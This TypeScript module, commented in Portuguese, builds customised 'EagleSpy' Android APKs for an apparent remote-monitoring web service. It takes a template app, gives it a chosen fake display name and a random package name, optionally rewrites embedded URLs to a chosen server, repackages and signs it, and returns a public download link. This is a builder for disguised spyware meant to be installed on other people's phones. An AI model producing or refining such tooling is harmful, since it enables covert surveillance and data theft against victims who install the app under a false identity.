import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Substituir placeholders no AndroidManifest.xml
 */
function modifyManifest(manifestPath: string, options: APKBuildOptions): void {
  let manifest = fs.readFileSync(manifestPath, 'utf-8');
  
  // Gerar package name único
  const packageName = `com.${options.appName.toLowerCase().replace(/[^a-z0-9]/g, '')}.${Date.now()}`;
  const packagePrefix = packageName.split('.').slice(0, -1).join('.');
  
  // Substituir placeholders
  manifest = manifest.replace(/\[EAGLE_PACKAGE_NAME\]/g, packageName);
  manifest = manifest.replace(/\[EAGLE2_PACK2\]/g, packagePrefix);
  manifest = manifest.replace(/\[EAGLE4_PACK4\]/g, 'intent');
  manifest = manifest.replace(/\[FAKE_NAME2\]/g, options.appName);
  
  fs.writeFileSync(manifestPath, manifest);
  console.log('[EAGLESPY-BUILD] Manifest modificado');
}

/**
 * Modificar strings em res/values/strings.xml
 */
function modifyStrings(stringsPath: string, options: APKBuildOptions): void {
  try {
    if (!fs.existsSync(stringsPath)) {
      console.warn('[EAGLESPY-BUILD] strings.xml não encontrado');
      return;
    }
    
    let strings = fs.readFileSync(stringsPath, 'utf-8');
    
    // Procurar por trademarks59 e substituir
    strings = strings.replace(
      /<string name="trademarks59">[^<]*<\/string>/,
      `<string name="trademarks59">${options.appName}</string>`
    );
    
    fs.writeFileSync(stringsPath, strings);
    console.log('[EAGLESPY-BUILD] Strings modificadas');
  } catch (err) {
    console.warn('[EAGLESPY-BUILD] Erro ao modificar strings:', err);
  }
}

/**
 * Substituir URL nos Smali files
 */
function modifySmaliFiles(smaliDir: string, options: APKBuildOptions): void {
  try {
    // Procurar por strings que parecem URLs
    const files = execSync(`find ${smaliDir} -name "*.smali" -type f`, { encoding: 'utf-8' })
      .split('\n')
      .filter(f => f.trim());
    
    for (const file of files) {
      if (!file) continue;
      
      try {
        let content = fs.readFileSync(file, 'utf-8');
        
        // Procurar por padrões de URL e substituir
        // Exemplo: "const-string v0, "http://example.com""
        const urlPattern = /const-string\s+v\d+,\s*"http[^"]*"/g;
        if (urlPattern.test(content)) {
          content = content.replace(urlPattern, `const-string v0, "${options.appUrl}"`);
          fs.writeFileSync(file, content);
        }
      } catch (err) {
        // Ignorar erros em arquivos individuais
      }
    }
    
    console.log('[EAGLESPY-BUILD] Smali files modificados');
  } catch (err) {
    console.warn('[EAGLESPY-BUILD] Erro ao modificar Smali:', err);
  }
}

/**
 * Build APK usando template EagleSpy
 */
export async function buildEagleSpyAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    const templateDir = path.join(apksDir, 'eagle-template');
    if (!fs.existsSync(templateDir)) {
      return {
        success: false,
        error: 'Template EagleSpy não encontrado'
      };
    }
    
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[EAGLESPY-BUILD] Iniciando build:', { templateDir, outputPath });
    
    const tempDir = `/tmp/eaglespy-build-${timestamp}-${randomSuffix}`;
    const buildDir = path.join(tempDir, 'build');
    
    try {
      // Criar diretório de trabalho
      console.log('[EAGLESPY-BUILD] Criando diretório de trabalho...');
      execSync(`mkdir -p ${tempDir}`);
      
      // Copiar template para diretório de trabalho
      console.log('[EAGLESPY-BUILD] Copiando template...');
      execSync(`cp -r ${templateDir} ${buildDir}`);
      
      // Modificar AndroidManifest.xml
      console.log('[EAGLESPY-BUILD] Modificando AndroidManifest.xml...');
      const manifestPath = path.join(buildDir, 'AndroidManifest.xml');
      modifyManifest(manifestPath, options);
      
      // Modificar strings
      console.log('[EAGLESPY-BUILD] Modificando strings...');
      const stringsPath = path.join(buildDir, 'res', 'values', 'strings.xml');
      modifyStrings(stringsPath, options);
      
      // Modificar Smali files (opcional, pode ser lento)
      // modifySmaliFiles(path.join(buildDir, 'smali'), options);
      
      // Reempacotar com apktool
      console.log('[EAGLESPY-BUILD] Reempacotando com apktool...');
      const apktoolJar = path.join(apksDir, 'apktool.jar');
      const unsignedApk = path.join(tempDir, 'app-unsigned.apk');
      
      execSync(`java -jar ${apktoolJar} b ${buildDir} -o ${unsignedApk}`, {
        stdio: 'pipe',
        timeout: 120000
      });
      
      // Alinhar
      console.log('[EAGLESPY-BUILD] Alinhando APK...');
      const alignedApk = path.join(tempDir, 'app-aligned.apk');
      execSync(`zipalign -f -v 4 ${unsignedApk} ${alignedApk}`);
      
      // Assinar com signer.jar do EagleSpy
      console.log('[EAGLESPY-BUILD] Assinando APK...');
      const signerJar = path.join(apksDir, 'signer.jar');
      const keystorePath = '/tmp/android.keystore';
      
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      // Usar jarsigner padrão
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${alignedApk} android`,
        { stdio: 'pipe' }
      );
      
      // Copiar para output
      fs.copyFileSync(alignedApk, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[EAGLESPY-BUILD] APK construído com sucesso');
      
      const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
      
      return {
        success: true,
        filename,
        downloadUrl
      };
    } catch (err) {
      console.error('[EAGLESPY-BUILD] Erro durante build:', err);
      try {
        execSync(`rm -rf ${tempDir}`);
      } catch (e) {
        // Ignorar erro ao limpar
      }
      
      return {
        success: false,
        error: err instanceof Error ? err.message : 'Erro desconhecido'
      };
    }
  } catch (error) {
    console.error('[EAGLESPY-BUILD] Erro:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
}
